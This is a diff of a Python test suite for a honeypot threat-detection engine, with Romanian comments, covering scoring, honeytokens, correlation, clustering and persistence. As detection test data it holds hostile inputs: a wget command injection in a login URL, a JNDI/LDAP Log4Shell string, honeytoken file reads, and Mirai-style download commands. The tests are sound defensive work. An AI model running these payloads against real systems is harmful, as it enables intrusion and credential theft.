@@ -2,18 +2,28 @@
 # Fiecare test verifica o regula. Daca ceva s-a stricat, vezi exact care.
 
 import os
+import random
 import re
+import tempfile
+from datetime import datetime, timedelta, timezone
 
-from filters import check_event, command_words, is_internal, build_alert, BruteForceTracker, HONEYTOKENS
+from filters import (check_event, command_words, is_internal, build_alert, alert_view, describe,
+                     BruteForceTracker, HONEYTOKENS, COMMAND_PATTERNS, COMMAND_WORDS, HTTP_RULES)
+from events import validate_event
+from engine import Engine
+from storage import JsonlStorage, MemoryStorage
 from scoring import score_to_severity
-from sessions import group_sessions, session_summary, SessionStore
-from recommendations import recommend, DEFAULT_RECOMMENDATION
+from sessions import group_sessions, session_summary, STAGES
+from recommendations import DEFAULT_RECOMMENDATION
 from stats import LiveStats
 from profiles import attacker_profile
-from correlation import correlate, jaccard
+from correlation import correlate, jaccard, gather_indicators, UnionFind
 from clustering import cluster, behavior_signature
 from blocklist import build_blocklist, dangerous_ips
 from attack_techniques import technique_for, navigator_layer
+from texts import RULE_LABELS, present_stages, present_campaign, present_family
+
+HERE = os.path.dirname(os.path.abspath(__file__))
 
 
 def command(text, url=""):
@@ -38,6 +48,26 @@ def score(event, tracker=None):
 
 def severity(event, tracker=None):
     return score_to_severity(check_event(event, tracker)[1])
+
+
+def reason(event, tracker=None):
+    """Textul alertei, asa cum il vede dashboard-ul."""
+    verdict = check_event(event, tracker)
+    return describe(verdict.rule, verdict.details, event)
+
+
+def full(event_type="login_attempt", ip="45.155.205.233", when=None, **fields):
+    """Un eveniment complet, ca de la agent (trece de validare)."""
+    when = when or datetime(2026, 11, 17, 10, 0, tzinfo=timezone.utc)
+    event = {"timestamp": when.strftime("%Y-%m-%dT%H:%M:%S.") + f"{when.microsecond // 1000:03d}Z",
+             "node_id": "gateway", "event_type": event_type, "source_ip": ip,
+             "source_port": 40000, "target_port": 22, "protocol": "SSH", "session_id": "sess-" + ip}
+    event.update(fields)
+    return event
+
+
+def failed_login(ip, n, when):
+    return full(ip=ip, when=when, credentials={"username": "root", "password": f"p{n}", "success": False})
 
 
 # --- scorul: severitatea iese din puncte, nu e fixa ------------------------
@@ -84,6 +114,7 @@ def test_http_rules():
 def test_internal_ip():
     assert is_internal({"source_ip": "192.168.1.20"}) is True
     assert is_internal({"source_ip": "8.8.8.8"}) is False
+    assert is_internal({"source_ip": None}) is False        # nu mai arunca exceptie
 
 
 def test_successful_login():
@@ -110,7 +141,7 @@ def test_session_stages():
         event["session_id"] = "s1"
         event["timestamp"] = f"2026-11-17T10:00:{second:02d}.000Z"
     summary = session_summary("s1", group_sessions(events)["s1"])
-    assert summary["stages"] == ["conectare", "incercare login", "login reusit", "comenzi", "descarcare", "persistenta"]
+    assert summary["stages"] == ["connect", "login_attempt", "login_success", "commands", "download", "persistence"]
     assert summary["successful_login"] == "root:root"
     assert summary["passwords"] == ["x", "root"]
 
@@ -125,20 +156,20 @@ def test_every_rule_has_a_recommendation():
         http("/?cmd=ls"), http("/?q=<script>"), login("root", "root", True, 0),
     ]
     for event in events:
-        is_threat, points, reason = check_event(event)
-        alert = build_alert(event, points, reason)
-        assert alert["recommendation"] != DEFAULT_RECOMMENDATION, reason
-        assert alert["severity"] == score_to_severity(points)
+        verdict = check_event(event)
+        alert = alert_view(build_alert(event, verdict), event)
+        assert alert["recommendation"] != DEFAULT_RECOMMENDATION, verdict.rule
+        assert alert["severity"] == score_to_severity(verdict.score)
 
 
 def test_behavior_builds_the_profile_score():
     # un bot care doar scaneaza aduna putine puncte; unul care intra + descarca + persistenta, multe
     scanner = [{"source_ip": "1.1.1.1", "severity": "LOW", "score": 6, "protocol": "HTTP"}]
-    full = [{"source_ip": "2.2.2.2", "severity": "CRITICAL", "score": 45, "protocol": "SSH"},
-            {"source_ip": "2.2.2.2", "severity": "HIGH", "score": 40, "protocol": "SSH"},
-            {"source_ip": "2.2.2.2", "severity": "CRITICAL", "score": 45, "protocol": "SSH"}]
+    full_attack = [{"source_ip": "2.2.2.2", "severity": "CRITICAL", "score": 45, "protocol": "SSH"},
+                   {"source_ip": "2.2.2.2", "severity": "HIGH", "score": 40, "protocol": "SSH"},
+                   {"source_ip": "2.2.2.2", "severity": "CRITICAL", "score": 45, "protocol": "SSH"}]
     p_scan = attacker_profile("1.1.1.1", [], scanner, 1)
-    p_full = attacker_profile("2.2.2.2", [], full, 3)
+    p_full = attacker_profile("2.2.2.2", [], full_attack, 3)
     assert p_scan["threat_score"] == 6 and p_scan["overall_severity"] == "LOW"
     assert p_full["threat_score"] == 130 and p_full["overall_severity"] == "CRITICAL"
 
@@ -165,16 +196,17 @@ def test_correlation_recovers_a_botnet():
     campaigns = correlate(summaries)
     assert len(campaigns) == 1
     assert campaigns[0]["ips"] == ["9.9.9.0", "9.9.9.1", "9.9.9.2"]
+    assert campaigns[0]["reason_codes"] == ["same_server"]
     assert jaccard({"a", "b"}, {"a", "b"}) == 1.0
 
 
 def test_attack_technique_tagging():
-    assert technique_for("atac brute-force detectat (5 parole gresite)")[0] == "T1110"
-    assert technique_for("login REUSIT cu root:root")[0] == "T1078"
-    assert technique_for("incercare de descarcare: http://x/bot")[0] == "T1105"
+    assert technique_for("brute_force")[0] == "T1110"
+    assert technique_for("login_success")[0] == "T1078"
+    assert technique_for("download_attempt")[0] == "T1105"
     assert technique_for("ceva necunoscut") is None
     # layer-ul pentru Navigator numara tehnicile
-    alerts = [{"alert_reason": "login REUSIT cu root:root"}, {"alert_reason": "login REUSIT cu admin:admin"}]
+    alerts = [{"technique": "T1078", "technique_name": "Valid Accounts"}] * 2
     layer = navigator_layer(alerts)
     assert layer["techniques"][0] == {"techniqueID": "T1078", "score": 2, "comment": "Valid Accounts"}
 
@@ -184,12 +216,13 @@ def test_clustering_groups_similar_behavior():
     def iot(ip):
         return {"source_ip": ip, "protocol": "TELNET",
                 "commands": ["/bin/busybox ECCHI", "wget http://x/m.arm7"],
-                "stages": ["conectare", "login reusit", "comenzi", "descarcare"]}
-    scanner = {"source_ip": "7.7.7.7", "protocol": "HTTP", "commands": [], "stages": ["conectare"]}
+                "stages": ["connect", "login_success", "commands", "download"]}
+    scanner = {"source_ip": "7.7.7.7", "protocol": "HTTP", "commands": [], "stages": ["connect"]}
     families = cluster([iot("1.1.1.1"), iot("2.2.2.2"), scanner])
     assert len(families) == 1
     assert families[0]["ips"] == ["1.1.1.1", "2.2.2.2"]
-    assert families[0]["label"] == "botnet IoT (tip Mirai)"
+    assert families[0]["code"] == "iot_botnet"
+    assert present_family(families[0])["label"] == "botnet IoT (tip Mirai)"
 
 
 def http_login(path, user, password, ip="1.2.3.4", second=0):
@@ -203,7 +236,8 @@ def test_http_login_also_checks_the_path():
     # parola din URL nu mai ascunde exploit-ul din cale: se pastreaza scorul mai mare
     event = http_login("/login.cgi?user=admin;wget+http://203.0.113.5/x", "admin", "admin")
     assert score(event, BruteForceTracker()) == 30
-    assert "ruleze comenzi" in check_event(event)[2]
+    assert check_event(event).rule == "web_command_injection"
+    assert "ruleze comenzi" in reason(event)
     assert severity(http_login("/?x=${jndi:ldap://a/b}", "admin", "x")) == "CRITICAL"
     # fara exploit in cale ramane regula de login
     assert score(http_login("/login.cgi?user=admin", "admin", "x")) == 8
@@ -219,7 +253,8 @@ def test_command_injection_in_url():
 def test_honeytoken_file_read():
     assert severity(command("cat /etc/hostapd.conf")) == "MEDIUM"
     assert severity(command("cd /etc/ppp; cat chap-secrets")) == "MEDIUM"   # doar numele, fara cale
-    assert "fisier-momeala" in check_event(command("grep wpa /etc/hostapd.conf"))[2]
+    assert check_event(command("grep wpa /etc/hostapd.conf")).rule == "honeytoken_read"
+    assert "fisier-momeala" in reason(command("grep wpa /etc/hostapd.conf"))
     # nu se pierde in spatele unei reguli mai slabe...
     assert score(command("uname -a; cat /etc/hostapd.conf")) == 20
     # ...dar nici nu acopera una mai grava (exfiltrare cu netcat)
@@ -239,14 +274,15 @@ def test_honeytoken_login_beats_brute_force():
     assert severity(login("2210417553", "x", False, 0)) == "CRITICAL"            # userul PPPoE
     assert severity(login("admin", '"Rp4tHx92kQ"', False, 0)) == "CRITICAL"      # copiat cu ghilimele
     assert severity(http_login("/login.cgi", "W7KQ2MVX9PLZ", "x")) == "NONE"    # alt text, nu e secretul
-    reason = check_event(login("admin", "w7Kq2mVx9pLz", False, 0))[2]
-    assert "hostapd.conf" in reason      # dashboard-ul o marcheaza HONEYTOKEN dupa numele fisierului
+    text = reason(login("admin", "w7Kq2mVx9pLz", False, 0))
+    assert "hostapd.conf" in text        # dashboard-ul o marcheaza HONEYTOKEN dupa numele fisierului
 
 
 def test_honeytoken_alerts_are_tagged():
-    read = build_alert(command("cat /etc/hostapd.conf"), 20, check_event(command("cat /etc/hostapd.conf"))[2])
+    read = command("cat /etc/hostapd.conf")
+    read = alert_view(build_alert(read, check_event(read)), read)
     used = login("admin", "Rp4tHx92kQ", False, 0)
-    used = build_alert(used, 50, check_event(used)[2])
+    used = alert_view(build_alert(used, check_event(used)), used)
     assert read["technique"] == "T1552.001" and used["technique"] == "T1078"
     assert read["recommendation"] != DEFAULT_RECOMMENDATION
     assert used["recommendation"] != DEFAULT_RECOMMENDATION
@@ -259,7 +295,8 @@ def test_correlation_links_honeytoken_reader_and_user():
     campaigns = correlate([reader, user, other])
     assert len(campaigns) == 1
     assert campaigns[0]["ips"] == ["8.8.8.2", "9.9.9.1"]
-    assert campaigns[0]["reasons"] == ["un IP a citit fisierul-momeala, altul i-a folosit secretul"]
+    assert campaigns[0]["reason_codes"] == ["honeytoken_passed_on"]
+    assert present_campaign(campaigns[0])["reasons"] == ["un IP a citit fisierul-momeala, altul i-a folosit secretul"]
 
 
 def test_session_keeps_usernames():
@@ -270,8 +307,7 @@ def test_session_keeps_usernames():
 
 def test_honeytokens_match_the_agent():
     # aceleasi secrete ca in agent (fs.go). In containerul threat-engine fisierul Go nu exista.
-    path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
-                        "..", "honeypot-agent", "internal", "vfs", "fs.go")
+    path = os.path.join(HERE, "..", "honeypot-agent", "internal", "vfs", "fs.go")
     if not os.path.exists(path):
         return
     with open(path, encoding="utf-8") as f:
@@ -293,6 +329,136 @@ def test_blocklist_filters_by_score():
     assert "2.2.2.2" not in build_blocklist(alerts)
 
 
+# --- pregatit pentru baza de date: cele 8 probleme, intr-un singur test ----
+
+class BrokenStorage(MemoryStorage):
+    """Ca un disc plin: orice salvare pica."""
+
+    def save(self, events, alerts, rejected=()):
+        raise OSError("disc plin")
+
+
+def random_summaries(seed, count):
+    """Sesiuni la intamplare: parole dintr-un dictionar mic, servere, fisiere-momeala."""
+    rng = random.Random(seed)
+    passwords = [f"p{n}" for n in range(12)]
+    summaries = []
+    for n in range(count):
+        downloads = []
+        if rng.random() < 0.15:
+            downloads.append(f"http://srv{rng.randrange(25)}.example/x")
+        if rng.random() < 0.05:
+            downloads.append(f"1.2.3.4/bin{rng.randrange(10)}")          # fara server in adresa
+        commands = rng.sample(["uname -a", "/bin/busybox X", "wget a", "crontab -l", "cat /etc/hostapd.conf",
+                               "cat chap-secrets", "bash -i"], rng.randint(0, 3))
+        usernames = ["root"] + (["2210417553"] if rng.random() < 0.03 else [])
+        summaries.append({"source_ip": f"10.0.{n // 256}.{n % 256}",
+                          "protocol": rng.choice(["SSH", "TELNET", "HTTP"]),
+                          "passwords": rng.sample(passwords, rng.randint(1, 6)), "usernames": usernames,
+                          "commands": commands, "downloads": downloads,
+                          "stages": STAGES[:rng.randint(1, 5)]})
+    return summaries
+
+
+def groups_from_pairs(ips, linked):
+    """Grupurile, comparand fiecare pereche (incet, dar sigur corect)."""
+    groups = UnionFind(ips)
+    for i in range(len(ips)):
+        for j in range(i + 1, len(ips)):
+            if linked(ips[i], ips[j]):
+                groups.union(ips[i], ips[j])
+    return sorted(sorted(g) for g in groups.groups().values() if len(g) >= 2)
+
+
+def test_ready_for_the_database():
+    now = datetime.now(timezone.utc)
+    attacker = "91.240.118.172"
+    attack = [failed_login(attacker, n, now + timedelta(seconds=n)) for n in range(4)]
+    download = full(event_type="command_exec", when=now, payload_details={
+        "command": "wget http://x/a", "extracted_url": "http://x/a", "raw_data": "x" * 5000})
+    lab = full(ip="192.168.1.50", when=now, credentials={"username": "root", "password": "root", "success": True})
+    storage = MemoryStorage()
+    engine = Engine(storage, include_internal=False)
+
+    # 2. un eveniment stricat e pus deoparte (cu motivul), restul lotului intra
+    result = engine.ingest(attack + [download, lab, {**download, "source_ip": None}, "text"])
+    assert result["accepted"] == 6 and result["rejected"] == 2
+    assert [r["reason"] for r in storage.rejected] == ["missing:source_ip", "not_object"]
+    assert validate_event({**download, "source_port": "22"})[1] == "bad:source_port"
+
+    # 1. fiecare eveniment are event_id (al agentului sau din continut); un lot retrimis nu se dubleaza
+    assert all(len(e["event_id"]) == 32 for e in storage.events)
+    assert validate_event({**download, "event_id": "abc123"})[0]["event_id"] == "abc123"
+    assert engine.ingest(attack)["duplicates"] == 4
+    assert len(storage.events) == 6 and engine.stats.total_events == 5
+
+    # 3. alerta salvata are id-ul ei + event_id, fara copia evenimentului; dashboard-ul primeste tot
+    saved = next(a for a in storage.alerts if a["rule"] == "download_attempt")
+    assert "payload_details" not in saved and len(saved["alert_id"]) == 32
+    shown = next(a for a in engine.recent_alerts if a["alert_id"] == saved["alert_id"])
+    assert shown["payload_details"]["raw_data"] == "x" * 5000
+    assert shown["alert_reason"] == "incercare de descarcare: http://x/a" and shown["technique"] == "T1105"
+
+    # 4. in date: coduri; textele (pe care le compara dashboard-ul) se fac la afisare
+    assert engine.summaries()[0]["stages"][0] == "connect"
+    assert present_stages({"stages": ["connect", "persistence"]})["stages"] == ["conectare", "persistenta"]
+    assert present_family({"code": "web_scanner", "common_behavior": []})["label"] == "scanner web"
+    for table in (COMMAND_PATTERNS, COMMAND_WORDS, HTTP_RULES):
+        assert all(rule in RULE_LABELS for _, _, rule in table)
+    trick = command("uname; echo brute-force fisier-momeala")      # textul atacatorului nu schimba tehnica
+    assert alert_view(build_alert(trick, check_event(trick)), trick)["technique"] == "T1082"
+
+    # 8. traficul intern e salvat si judecat, dar ascuns la citire (INCLUDE_INTERNAL=false)
+    assert any(a["source_ip"] == "192.168.1.50" for a in storage.alerts)
+    assert all(a["source_ip"] != "192.168.1.50" for a in engine.recent_alerts)
+
+    # 6 + 7. repornire (alt engine, aceleasi date): se reface tot, si brute force-ul nu porneste de la 0
+    restarted = Engine(storage, include_internal=True)
+    restarted.load()
+    assert restarted.stats.total_alerts == len(storage.alerts) == 3
+    assert restarted.ingest(attack)["duplicates"] == 4
+    fifth = restarted.ingest([failed_login(attacker, 5, now + timedelta(seconds=5))])
+    assert [a["rule"] for a in fifth["new_alerts"]] == ["brute_force"]
+
+    # 2. daca salvarea pica, nu se schimba nimic in RAM; agentul retrimite si totul se face o data
+    broken = Engine(BrokenStorage())
+    try:
+        broken.ingest(attack)
+        assert False, "trebuia sa arunce OSError"
+    except OSError:
+        pass
+    assert broken.stats.total_events == 0 and broken.tracker.failures == {} and not broken.seen.ids
+    with tempfile.TemporaryDirectory() as folder:       # la JSONL: fisierele sunt taiate inapoi
+        events_file = os.path.join(folder, "events.jsonl")
+        with open(events_file, "w", encoding="utf-8") as f:
+            f.write('{"vechi": 1}\n')
+        os.mkdir(os.path.join(folder, "alerts.jsonl"))  # un folder in locul fisierului: alertele nu se pot scrie
+        jsonl = JsonlStorage(events_file, os.path.join(folder, "alerts.jsonl"), os.path.join(folder, "r.jsonl"))
+        try:
+            jsonl.save([{"nou": 1}], [{"b": 2}])
+            assert False, "trebuia sa arunce OSError"
+        except OSError:
+            pass
+        assert list(jsonl.iter_events()) == [{"vechi": 1}]
+
+    # 5. corelarea si clustering-ul nu mai compara toate perechile, dar gasesc aceleasi grupuri
+    summaries = random_summaries(1, 300)
+    found = gather_indicators(summaries)
+
+    def linked(a, b):
+        x, y = found[a], found[b]
+        return bool((x["read"] & y["used"]) or (y["read"] & x["used"]) or (x["used"] & y["used"])
+                    or (x["servers"] & y["servers"]) or (x["malware"] & y["malware"])
+                    or (len(x["passwords"]) >= 3 and len(y["passwords"]) >= 3
+                        and jaccard(x["passwords"], y["passwords"]) >= 0.6))
+
+    assert sorted(c["ips"] for c in correlate(summaries)) == groups_from_pairs(list(found), linked)
+    signatures = behavior_signature(summaries)
+    assert sorted(f["ips"] for f in cluster(summaries)) == groups_from_pairs(
+        list(signatures), lambda a, b: jaccard(signatures[a], signatures[b]) >= 0.5)
+    assert restarted.campaigns() is restarted.campaigns()   # si rezultatul sta in cache
+
+
 if __name__ == "__main__":
     tests = [
         test_score_bands, test_command_words, test_id_is_a_whole_word, test_download_is_serious,
@@ -304,7 +470,7 @@ if __name__ == "__main__":
         test_blocklist_filters_by_score, test_http_login_also_checks_the_path,
         test_command_injection_in_url, test_honeytoken_file_read, test_honeytoken_login_beats_brute_force,
         test_honeytoken_alerts_are_tagged, test_correlation_links_honeytoken_reader_and_user,
-        test_session_keeps_usernames, test_honeytokens_match_the_agent,
+        test_session_keeps_usernames, test_honeytokens_match_the_agent, test_ready_for_the_database,
     ]
     for test in tests:
         test()
